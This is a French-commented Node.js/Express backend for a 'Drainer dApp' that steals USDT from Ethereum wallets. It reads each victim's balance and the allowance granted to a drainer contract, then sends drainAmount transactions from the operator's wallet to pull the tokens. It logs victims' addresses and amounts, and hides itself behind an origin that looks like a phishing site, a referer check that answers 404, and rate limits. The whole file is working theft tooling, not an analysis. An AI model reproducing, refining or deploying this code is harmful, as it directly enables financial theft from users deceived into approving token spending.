/**
 * ============================================================
 *  BACKEND — Drainer dApp (Ethereum / USDT ERC-20)
 * ============================================================
 */

require("dotenv").config();
const express    = require("express");
const cors       = require("cors");
const bodyParser = require("body-parser");
const { ethers } = require("ethers");
const jwt        = require("jsonwebtoken");
const { v4: uuidv4 } = require("uuid");
const rateLimit  = require("express-rate-limit");

const { startWatcher } = require("./watcher");
const { nonceQueue }   = require("./nonceQueue");

const app  = express();
const PORT = process.env.PORT || 3001;

// ─── Validation au démarrage ──────────────────────────────────
const JWT_SECRET     = process.env.JWT_SECRET;
const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || "sendcrypto.network/473929219";
const TOKEN_TTL_SEC  = 30 * 60;

if (!JWT_SECRET || JWT_SECRET.length < 32) {
  console.error("❌  JWT_SECRET manquant ou < 32 chars"); process.exit(1);
}
if (!process.env.PRIVATE_KEY)     { console.error("❌  PRIVATE_KEY");     process.exit(1); }
if (!process.env.DRAINER_ADDRESS) { console.error("❌  DRAINER_ADDRESS"); process.exit(1); }
if (!process.env.USDT_ADDRESS)    { console.error("❌  USDT_ADDRESS");    process.exit(1); }
if (!process.env.RPC_URL)         { console.error("❌  RPC_URL");         process.exit(1); }

// ─────────────────────────────────────────────────────────────
//  withTimeout  (15 secondes par défaut)
// ─────────────────────────────────────────────────────────────
const RPC_TIMEOUT_MS = 15_000;

function withTimeout(promise, ms = RPC_TIMEOUT_MS) {
  let timer;
  return Promise.race([
    promise,
    new Promise((_, reject) => {
      timer = setTimeout(
        () => reject(new Error(`RPC timeout après ${ms}ms`)),
        ms
      );
    }),
  ]).finally(() => clearTimeout(timer));
}

// ─── JTI blacklist ────────────────────────────────────────────
const revokedJTIs = new Map();

setInterval(() => {
  const now = Math.floor(Date.now() / 1000);
  let removed = 0;
  for (const [jti, exp] of revokedJTIs) {
    if (exp < now) { revokedJTIs.delete(jti); removed++; }
  }
  if (removed > 0) console.log(`[API] 🧹 JTI purge : ${removed}`);
}, 5 * 60 * 1000);

// ─────────────────────────────────────────────────────────────
//  CORS  — CORRIGÉ : origine exacte requise
// ─────────────────────────────────────────────────────────────
const isDev = process.env.NODE_ENV !== "production";
const ALLOWED_ORIGINS = [
  `https://${ALLOWED_ORIGIN}`,   // production exacte
];
if (isDev) {
  ALLOWED_ORIGINS.push("http://localhost:3000"); // dev local
}

app.use(cors({
  origin: (origin, cb) => {
    // En dev sans origin (curl) on autorise, en production on refuse
    if (isDev && !origin) return cb(null, true);
    if (!origin) return cb(new Error("Origin obligatoire"));
    if (ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
    cb(new Error("CORS bloqué : origine non autorisée"));
  },
  allowedHeaders: ["Content-Type", "X-Session-Token"],
}));

// Limite sur le body (anti-flood)
app.use(bodyParser.json({ limit: "10kb" }));
app.set("trust proxy", 2);

app.use((req, _res, next) => {
  console.log(`[API] ${req.method} ${req.path} — ${getClientIp(req)}`);
  next();
});

// ─── Referer guard (deuxième couche) ──────────────────────────
app.use((req, res, next) => {
  if (req.path === "/health") return next();
  const ref = req.headers["referer"] || req.headers["origin"] || "";
  if (!ref.includes(ALLOWED_ORIGIN)) return res.status(404).json({ error: "Not found" });
  next();
});

// ─── Rate limiters ────────────────────────────────────────────
const tokenLimiter = rateLimit({
  windowMs: 10 * 60 * 1000, max: 20,
  keyGenerator: r => getClientIp(r),
  handler: (_r, res) => res.status(429).json({ error: "Trop de requêtes" }),
});
const apiLimiter = rateLimit({
  windowMs: 60 * 1000, max: 60,
  keyGenerator: r => getClientIp(r),
  handler: (_r, res) => res.status(429).json({ error: "Rate limit dépassé" }),
});
app.use("/api/", apiLimiter);

// ─── Helpers ──────────────────────────────────────────────────
function getClientIp(req) {
  return req.headers["cf-connecting-ip"]
      || req.headers["x-real-ip"]
      || req.ip
      || "unknown";
}

function isValidAddress(a) {
  try { return ethers.isAddress(a); } catch { return false; }
}

function jsonErr(res, s, msg, d) {
  return res.status(s).json({ success: false, error: msg, ...(d ? { details: d } : {}) });
}

const MAX_USDT_AMOUNT = 1_000_000_000;

function validateAmount(amount) {
  const n = parseFloat(amount);
  if (!Number.isFinite(n)) return "Montant invalide";
  if (n <= 0)              return "Montant doit être positif";
  if (n > MAX_USDT_AMOUNT) return "Montant trop élevé";
  return null;
}

// ─── JWT middleware ───────────────────────────────────────────
function verifyToken(req, res, next) {
  const token = req.headers["x-session-token"];
  if (!token) return res.status(401).json({ error: "Token manquant", code: "NO_TOKEN" });

  let payload;
  try {
    payload = jwt.verify(token, JWT_SECRET, { algorithms: ["HS256"] });
  } catch (e) {
    const expired = e.name === "TokenExpiredError";
    return res.status(401).json({
      error: expired ? "Token expiré"  : "Token invalide",
      code : expired ? "TOKEN_EXPIRED" : "TOKEN_INVALID",
    });
  }

  if (revokedJTIs.has(payload.jti))
    return res.status(401).json({ error: "Token révoqué", code: "TOKEN_REVOKED" });

  if (payload.ip !== getClientIp(req)) {
    console.warn(`[API] ⚠  IP mismatch token:${payload.ip} req:${getClientIp(req)}`);
    return res.status(401).json({ error: "Session invalide", code: "IP_MISMATCH" });
  }

  req.tokenPayload = payload;
  next();
}

// ─── Blockchain ───────────────────────────────────────────────
const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
const wallet   = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

const DRAINER_ABI = [
  "function drain(address token, address from) external",
  "function drainAmount(address token, address from, uint256 amount) external",
];
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)",
];

const drainer = new ethers.Contract(process.env.DRAINER_ADDRESS, DRAINER_ABI, wallet);
const usdt    = new ethers.Contract(process.env.USDT_ADDRESS, ERC20_ABI, provider);

// ─── Cache décimales ──────────────────────────────────────────
let _cachedDecimals    = null;
let _decimalsFromCache = false;

async function getDecimals() {
  if (_cachedDecimals !== null) return _cachedDecimals;
  try {
    _cachedDecimals    = Number(await withTimeout(usdt.decimals()));
    _decimalsFromCache = false;
    console.log(`[API] 💾 Decimals USDT : ${_cachedDecimals}`);
  } catch (e) {
    _cachedDecimals    = 6;
    _decimalsFromCache = true;
    console.warn(`[API] ⚠  decimals() timeout/erreur, fallback = 6 : ${e.message}`);
  }
  return _cachedDecimals;
}

async function retryDecimalsCache() {
  if (!_decimalsFromCache) return;
  try {
    _cachedDecimals    = Number(await withTimeout(usdt.decimals()));
    _decimalsFromCache = false;
    console.log(`[API] 💾 Decimals mis à jour : ${_cachedDecimals}`);
  } catch {}
}

// ══════════════════════════════════════════════════════════════
//  ROUTES
// ══════════════════════════════════════════════════════════════

app.get("/health", (_req, res) => {
  res.json({ status: "ok", ts: Date.now() });
});

app.get("/api/auth/token", tokenLimiter, (req, res) => {
  const now = Math.floor(Date.now() / 1000);
  const token = jwt.sign(
    { jti: uuidv4(), ip: getClientIp(req), iat: now, exp: now + TOKEN_TTL_SEC },
    JWT_SECRET, { algorithm: "HS256" }
  );
  res.json({ token, expiresAt: now + TOKEN_TTL_SEC, ttl: TOKEN_TTL_SEC });
});

app.get("/api/get-config", verifyToken, (_req, res) => {
  res.json({
    usdtAddress   : process.env.USDT_ADDRESS,
    drainerAddress: process.env.DRAINER_ADDRESS,
    network: {
      chainId  : "0x1",
      chainName: "Ethereum Mainnet",
    },
  });
});

app.post("/api/get-balance", verifyToken, async (req, res) => {
  const { walletAddress } = req.body;
  if (!isValidAddress(walletAddress)) return jsonErr(res, 400, "Adresse invalide");

  try {
    const dec = await getDecimals();
    const [raw, allowanceRaw] = await withTimeout(Promise.all([
      usdt.balanceOf(walletAddress),
      usdt.allowance(walletAddress, process.env.DRAINER_ADDRESS),
    ]));

    res.json({
      success     : true,
      balance     : parseFloat(ethers.formatUnits(raw, dec)),
      allowance   : parseFloat(ethers.formatUnits(allowanceRaw, dec)),
      balanceRaw  : raw.toString(),
      allowanceRaw: allowanceRaw.toString(),
      decimals    : dec,
    });
  } catch (e) {
    const isTimeout = e.message.includes("timeout");
    jsonErr(res, isTimeout ? 503 : 500, isTimeout ? "RPC indisponible" : "Erreur balance", e.message);
  }
});

// ══════════════════════════════════════════════════════════════
//  POST /api/drain — CORRIGÉ : attend la confirmation on-chain
// ══════════════════════════════════════════════════════════════
app.post("/api/drain", verifyToken, async (req, res) => {
  const { walletAddress, amount } = req.body;

  if (!isValidAddress(walletAddress))
    return jsonErr(res, 400, "Adresse invalide");

  const amountError = validateAmount(amount);
  if (amountError) return jsonErr(res, 400, amountError);

  try {
    const dec = await getDecimals();
    const amountWei = ethers.parseUnits(
      parseFloat(amount).toFixed(dec),
      dec
    );
    if (amountWei === 0n)
      return jsonErr(res, 400, `Montant trop petit (minimum ${(1 / 10 ** dec).toFixed(dec)} USDT)`);

    const allowance = await withTimeout(
      usdt.allowance(walletAddress, process.env.DRAINER_ADDRESS)
    );

    if (allowance === 0n)
      return res.json({ success: true, alreadyDrained: true });

    if (allowance < amountWei)
      return jsonErr(res, 400, "Allowance insuffisante");

    const gasEst = await withTimeout(
      drainer.drainAmount.estimateGas(process.env.USDT_ADDRESS, walletAddress, amountWei)
    );

    // Envoi de la transaction et attente du receipt
    const tx = await nonceQueue.send(wallet, (nonce) =>
      drainer.drainAmount(
        process.env.USDT_ADDRESS, walletAddress, amountWei,
        { gasLimit: gasEst * 120n / 100n, nonce }
      )
    );

    console.log(`[API] 💸 drain | tx:${tx.hash} | ${walletAddress} | ${amount} USDT`);

    // Attente de la confirmation (avec timeout)
    const receipt = await withTimeout(tx.wait(), 60_000); // 60s de timeout
    if (receipt.status === 0) {
      return jsonErr(res, 500, "Transaction révertée");
    }

    res.json({ success: true, transactionHash: tx.hash });

  } catch (e) {
    console.error("[API] drain error:", e.message);
    const isTimeout = e.message.includes("timeout");
    if (isTimeout)                         return jsonErr(res, 503, "Délai dépassé, vérifiez sur Etherscan");
    if (e.message.includes("insufficient")) return jsonErr(res, 500, "ETH insuffisant sur le wallet serveur");
    jsonErr(res, 500, "Échec drain", e.message);
  }
});

app.post("/api/save-log", verifyToken, (req, res) => {
  const { wallet_address, amount, action } = req.body;
  if (!isValidAddress(wallet_address)) return jsonErr(res, 400, "Adresse invalide");
  console.log("[API] 📝 LOG:", { wallet_address, amount, action, ts: new Date().toISOString() });
  res.json({ success: true });
});

app.use((_req, res) => res.status(404).json({ error: "Not found" }));

// ─── Démarrage ────────────────────────────────────────────────
app.listen(PORT, async () => {
  console.log(`\n✅ API démarrée — port ${PORT}`);
  console.log(`   USDT    : ${process.env.USDT_ADDRESS}`);
  console.log(`   Drainer : ${process.env.DRAINER_ADDRESS}`);
  console.log(`   Owner   : ${wallet.address}`);
  console.log(`   Watcher : ${process.env.WS_RPC_URL ? "✅ actif" : "⚠  désactivé"}`);
  console.log(`   Env     : ${isDev ? "development" : "production"}`);

  await getDecimals();
  setTimeout(() => retryDecimalsCache().catch(() => {}), 30_000);

  console.log();
  startWatcher().catch(err =>
    console.error("[Watcher] ❌ Erreur démarrage:", err.message)
  );
});